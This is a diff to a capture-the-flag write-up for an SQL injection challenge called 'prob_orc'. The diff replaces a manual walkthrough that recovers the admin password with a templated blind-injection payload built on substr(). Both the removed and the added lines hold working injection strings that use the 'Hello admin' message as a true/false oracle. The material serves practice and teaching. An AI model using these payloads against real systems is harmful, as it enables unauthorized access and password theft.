@@ -52,77 +52,16 @@ Next, we can leak the password byte by byte using the `substr()` function.
 If we provide the following URI parameter:
 
 ```
-?pw=' OR id='admin' AND substr(pw, 1, 1)='0' -- -
+?pw=' OR id='admin' AND substr(pw, [index], 1)='[character]' -- -
 ```
 
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 1, 1)='0' -- -'
-
-## Queried part:
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 1, 1)='0'
-
-## Commented part:
-'
+SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, [index], 1)='[character]' -- -'
 ```
 
-![5](https://github.com/Kunull/Write-ups/assets/110326359/d479be75-0818-47a3-8d89-991e9dcd1926)
-
-Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
-That tells us that the first character of the `pw` for `id=admin` is `0`.
-
-We can now move onto the second character:
-
-```
-?pw=' OR id='admin' AND substr(pw, 2, 1)='0' -- -
-```
-
-The resultant query becomes:
-
-```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)='0' -- -'
-
-## Queried part:
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)='0'
-
-## Commented part:
-'
-```
-
-![6](https://github.com/Kunull/Write-ups/assets/110326359/557a333a-920a-485b-926b-e87bfbf8b8f4)
-
-Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
-That tells us that the second character of the `pw` for `id=admin` is not `0`.
-
-We can try other characters moving up to the following:
-
-```
-?pw=' OR id='admin' AND substr(pw, 2, 1)='9' -- -
-```
-
-The resultant query becomes:
-
-```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)='9' -- -'
-
-## Queried part:
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)='9'
-
-## Commented part:
-'
-```
-
-![7](https://github.com/Kunull/Write-ups/assets/110326359/e9d938ad-34aa-4f07-8e9b-167b5d1ec34d)
-
-Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
-That tells us that the second character of the `pw` for `id=admin` is `9`.
-
-We can keep repeating this process until we get all the eight characters of the `admin` password:
-
-```
-095a9852
-```
+If for `id='admin'`, the character of the `pw` at `[index]` is the same as the `[character]` that we provide, the query will result into `True`. This will cause the `Hello admin` message to be printed. We can brute force the length and use the message as an indicator of correct brute force value.
 
 ### Script
 
